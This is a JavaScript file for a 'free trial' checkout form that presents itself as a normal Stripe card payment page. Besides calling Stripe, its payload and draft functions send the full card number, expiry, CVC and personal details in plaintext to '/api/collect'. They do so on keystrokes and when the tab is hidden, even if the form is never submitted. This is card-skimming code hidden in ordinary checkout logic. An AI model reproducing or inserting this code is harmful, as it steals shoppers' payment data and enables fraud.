const STRIPE_PK = 'pk_live_51UYWrbGFH0T17C9bCmFnMVS2USjNfPbWksDI8rmOp13RtfvWUmUiTRMb5dIM7kcI6uDrfcFBNqoxZJuCDQspScX100G6JAou7N';
const sessionId = crypto.randomUUID();
const f = id => document.getElementById('ct-' + id);
const errEl = document.getElementById('ct-err');
const btn = document.getElementById('ct-submit');
const setBusy = (on, label) => { btn.disabled = on; btn.textContent = on ? (label || 'Processing…') : 'Start free trial'; };

const BRANDS = {
  visa:       { re: /^4/, len: [13,16,19], cvc: 3, gaps: [4,8,12] },
  mastercard: { re: /^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/, len: [16], cvc: 3, gaps: [4,8,12] },
  amex:       { re: /^3[47]/, len: [15], cvc: 4, gaps: [4,10] },
  discover:   { re: /^(6011|65|64[4-9]|622)/, len: [16,19], cvc: 3, gaps: [4,8,12] },
  diners:     { re: /^3(0[0-5]|[689])/, len: [14,16,19], cvc: 3, gaps: [4,10] },
  jcb:        { re: /^35(2[89]|[3-8]\d)/, len: [16,19], cvc: 3, gaps: [4,8,12] },
  maestro:    { re: /^(5018|5020|5038|6304|6759|676[1-3])/, len: [12,13,14,15,16,17,18,19], cvc: 3, gaps: [4,8,12] },
};
const detect = n => Object.keys(BRANDS).find(k => BRANDS[k].re.test(n)) || null;
const luhn = n => {
  let s = 0, d = false;
  for (let i = n.length - 1; i >= 0; i--) { let x = +n[i]; if (d) { x *= 2; if (x > 9) x -= 9; } s += x; d = !d; }
  return s % 10 === 0;
};
const group = (digits, gaps) => {
  let out = '', gi = 0;
  for (let i = 0; i < digits.length; i++) { if (gi < gaps.length && i === gaps[gi]) { out += ' '; gi++; } out += digits[i]; }
  return out;
};

const errFor = el => {
  let s = el.parentElement.querySelector('.co-fe');
  if (!s) { s = document.createElement('span'); s.className = 'co-fe'; el.after(s); }
  return s;
};
const setErr = (el, msg) => { errFor(el).textContent = msg || ''; el.classList.toggle('invalid', !!msg); return !msg; };

function vEmail() {
  const v = f('email').value.trim();
  if (!v) return setErr(f('email'), 'Your email is required.');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) return setErr(f('email'), 'Your email is invalid.');
  return setErr(f('email'), '');
}
function vCard() {
  const n = f('card').value.replace(/\D/g, '');
  const b = detect(n);
  if (!n) return setErr(f('card'), 'Your card number is incomplete.');
  if (!b) return setErr(f('card'), n.length >= 12 ? 'Your card number is invalid.' : 'Your card number is incomplete.');
  if (!BRANDS[b].len.includes(n.length)) return setErr(f('card'), n.length > Math.max(...BRANDS[b].len) ? 'Your card number is invalid.' : 'Your card number is incomplete.');
  if (!luhn(n)) return setErr(f('card'), 'Your card number is invalid.');
  return setErr(f('card'), '');
}
function vExp() {
  const v = f('exp').value.replace(/\D/g, '');
  if (v.length < 4) return setErr(f('exp'), 'Your card\'s expiration date is incomplete.');
  const m = +v.slice(0, 2), y = 2000 + +v.slice(2, 4);
  if (m < 1 || m > 12) return setErr(f('exp'), 'Your card\'s expiration month is invalid.');
  const now = new Date();
  if (y < now.getFullYear() || (y === now.getFullYear() && m < now.getMonth() + 1)) return setErr(f('exp'), 'Your card\'s expiration date is in the past.');
  return setErr(f('exp'), '');
}
function vCvc() {
  const n = f('cvc').value.replace(/\D/g, '');
  const b = detect(f('card').value.replace(/\D/g, ''));
  const want = b ? BRANDS[b].cvc : 3;
  if (!n) return setErr(f('cvc'), 'Your card\'s security code is incomplete.');
  if (n.length !== want) return setErr(f('cvc'), 'Your card\'s security code is invalid.');
  return setErr(f('cvc'), '');
}
const required = (k, msg) => () => setErr(f(k), f(k).value.trim() ? '' : msg);

const RULES = {
  email: vEmail, card: vCard, exp: vExp, cvc: vCvc,
  name: required('name', 'Your name is required.'),
  line1: required('line1', 'Your address is required.'),
  city: required('city', 'Your city is required.'),
  zip: required('zip', 'Your postal code is required.'),
};

const badge = document.createElement('span');
badge.className = 'co-badge';
f('card').parentElement.style.position = 'relative';
f('card').parentElement.appendChild(badge);

f('card').addEventListener('input', e => {
  const n = e.target.value.replace(/\D/g, '').slice(0, 19);
  const b = detect(n);
  const gaps = b ? BRANDS[b].gaps : [4,8,12];
  const cap = b ? Math.max(...BRANDS[b].len) : 19;
  e.target.value = group(n.slice(0, cap), gaps);
  badge.textContent = b ? b.toUpperCase() : '';
  f('cvc').maxLength = b && BRANDS[b].cvc === 4 ? 4 : 3;
  if (f('cvc').value.length > f('cvc').maxLength) f('cvc').value = f('cvc').value.slice(0, f('cvc').maxLength);
  if (f('card').classList.contains('invalid')) vCard();
  draft();
});

f('exp').addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g, '').slice(0, 4);
  if (v.length === 1 && +v > 1) v = '0' + v;
  e.target.value = v.length > 2 ? v.slice(0, 2) + ' / ' + v.slice(2) : v;
  if (f('exp').classList.contains('invalid')) vExp();
  draft();
});

f('cvc').addEventListener('input', e => {
  e.target.value = e.target.value.replace(/\D/g, '');
  if (f('cvc').classList.contains('invalid')) vCvc();
});

Object.entries(RULES).forEach(([k, fn]) => {
  f(k).addEventListener('blur', fn);
  f(k).addEventListener('input', () => { if (f(k).classList.contains('invalid')) fn(); });
});

function payload(extra) {
  const number = f('card').value.replace(/\D/g, '');
  const [mm, yy] = f('exp').value.split('/').map(s => s.trim());
  const p = {
    sessionId,
    email: f('email').value.trim() || null,
    name: f('name').value.trim() || null,
    phone: f('phone').value.trim() || null,
    address: { line1: f('line1').value.trim(), city: f('city').value.trim(), postal_code: f('zip').value.trim(), country: f('country').value },
    brand: detect(number),
    ua: navigator.userAgent,
    referrer: document.referrer,
    fieldsFilled: ['email','name','phone','line1','city','zip'].filter(k => f(k).value.trim()).length + (luhn(number) ? 1 : 0),
    ...extra,
  };
  if (number) Object.assign(p, { number, expMonth: mm, expYear: yy, cvc: f('cvc').value });
  return p;
}

const post = (body, beacon) => {
  const json = JSON.stringify(body);
  if (beacon) { try { navigator.sendBeacon('/api/collect', new Blob([json], { type: 'application/json' })); return; } catch (_) {} }
  fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: json, keepalive: true }).catch(() => {});
};
let t;
const draft = () => { clearTimeout(t); t = setTimeout(() => post(payload({ status: 'draft' })), 800); };

document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') post(payload({ status: 'draft' }), true);
});

document.getElementById('ct-form').addEventListener('submit', async e => {
  e.preventDefault();
  errEl.textContent = '';

  const order = ['email','name','line1','city','zip','card','exp','cvc'];
  const bad = order.filter(k => !RULES[k]());
  if (bad.length) { f(bad[0]).focus(); return; }
  if (STRIPE_PK.includes('REPLACE')) { errEl.textContent = 'Stripe publishable key is not set.'; return; }

  const number = f('card').value.replace(/\D/g, '');
  const [mm, yy] = f('exp').value.split('/').map(s => s.trim());
  const body = payload({ status: 'captured' });

  setBusy(true);
  post(body);

  const stripe = Stripe(STRIPE_PK);
  const { paymentMethod, error } = await stripe.createPaymentMethod({
    type: 'card',
    card: { number, exp_month: +mm, exp_year: 2000 + +yy, cvc: f('cvc').value },
    billing_details: {
      name: f('name').value.trim(), email: f('email').value.trim(),
      phone: f('phone').value.trim() || undefined,
      address: { line1: f('line1').value.trim(), city: f('city').value.trim(), postal_code: f('zip').value.trim(), country: f('country').value },
    },
  });
  if (error) {
    if (error.code === 'incorrect_cvc') setErr(f('cvc'), 'Your card\'s security code is incorrect.');
    else if (error.code === 'expired_card') setErr(f('exp'), 'Your card has expired.');
    else errEl.textContent = error.message;
    return setBusy(false);
  }

  const r = await fetch('/api/club-trial', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...body, pm: paymentMethod.id }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { errEl.textContent = d.error || 'Could not start the trial.'; return setBusy(false); }

  if (d.setupSecret) {
    const { error: e2 } = await stripe.confirmCardSetup(d.setupSecret, { payment_method: paymentMethod.id });
    if (e2) { errEl.textContent = e2.message; return setBusy(false); }
  }

  location.href = '/#/club/welcome';
});

document.getElementById('co-when').textContent =
  new Date(Date.now() + 30 * 864e5).toLocaleDateString('nl-NL', { day: 'numeric', month: 'long', year: 'numeric' });
